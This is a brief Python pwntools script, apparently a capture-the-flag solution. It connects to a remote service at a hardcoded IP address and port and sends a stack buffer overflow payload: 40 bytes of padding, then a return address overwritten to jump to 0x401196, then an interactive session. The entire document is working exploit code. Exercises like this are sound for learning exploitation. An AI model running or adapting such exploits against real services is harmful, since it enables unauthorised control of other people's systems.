from pwn import *

p = remote("146.19.212.156", 10002)

payload = b"A" * 40 # 32 for var + 8 byte for rbp
payload += p64(0x401196)
p.sendline(payload)
p.interactive()